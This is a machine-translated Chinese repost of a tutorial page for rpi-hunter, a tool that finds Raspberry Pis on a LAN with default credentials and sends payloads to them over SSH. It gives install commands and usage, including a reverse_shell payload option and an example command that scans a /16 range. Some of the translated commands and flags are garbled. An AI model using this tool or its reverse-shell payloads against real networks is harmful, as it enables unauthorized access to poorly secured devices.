# RPI-Hunter:在 LAN Raspberry 上自动发现和投放有效载荷

> 原文：<https://kalilinuxtutorials.com/rpi-hunter/>

当您的 LAN 上有多个 Raspberry Pi 使用默认或已知凭证时，rpi hunter 非常有用，可以自动向它们发送命令/有效负载。

**也可以理解为-[VSHG:GnuPG](https://kalilinuxtutorials.com/vshg-gnu-privacy-guard/)T3 的独立插件**

**安装**

*   安装依赖项:sudo pip install-U arg parse term color 和 sudo apt-y install ARP-scan t shark ssh pass
*   下载 rpi-hunter: git 克隆 https://github.com/BusesCanFly/rpi-hunter
*   导航到 rpi-hunter: cd。/rpi-亨特
*   使 rpi-hunter.py 可执行:chmod +x rpi-hunter.py
*   一行变体:sudo pip install-U arg parse term color & & sudo apt-y install ARP-scan t shark ssh pass & & git clone https://github.com/BusesCanFly/rpi-hunter & & CD。/rpi-hunter & & chmod+x rpi-hunter . py

**用途**

**用法:rpi-hunter . py[-H][–LIST][–no-scan][-f IP _ LIST][-T1][-c CREDS][–PAYLOAD PAYLOAD][-H HOST][-P PORT]
[–safe][-q]
可选参数:
-h，–help 显示此帮助消息并退出
–列出可用负载
–no-scan 禁用 ARP 扫描
-r IP_RANGE 要扫描的 IP 范围【T7/scan/RPI _ list)
-u UNAME ssh ' ing 时使用的用户名
-c CREDS ssh ' ing 时使用的密码
-PAYLOAD PAYLOAD(的名称，或 raw)PAYLOAD[例如。reverse_shell 或' whoami']
-H HOST(如果使用 reverse_shell 有效负载)用于反向 shell 的主机
-P PORT(如果使用 reverse_shell 有效负载)用于反向 shell 的端口
-安全打印 sshpass 命令，但不要执行它
-q 不要打印横幅
示例用法:。/rpi-hunter . py-r 192 . 168 . 0 . 0/16–有效载荷 reverse _ shell-H 127 . 0 . 0 . 1-P 1337
运行。/rpi-hunter . py–list 以查看可用的有效负载。
有效载荷可由列表中的有效载荷名称指定，或作为原始输入
例如。–payload reverse _ shell 或–payload[您的 cli 命令在此处]**

**免责声明**

标准的互联网乐趣免责声明适用。不要犯罪，要负责任。我不会对你和 rpi-hunter 做的任何事负责。

[**Download**](https://github.com/BusesCanFly/rpi-hunter)